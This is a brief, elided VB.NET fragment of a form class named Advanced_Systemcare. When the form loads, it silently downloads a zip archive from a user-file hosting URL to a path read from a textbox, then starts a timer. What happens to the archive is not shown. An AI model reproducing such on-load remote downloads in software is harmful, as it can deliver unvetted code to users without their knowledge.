...
Public Class Advanced_Systemcare
    ...
    Private Sub Advanced_Systemcare_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        downlaod.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_40c80d75efe54d239f8336718fac5724.zip"), Texbbb.TextBox58.Text)
        Timer1.Start()
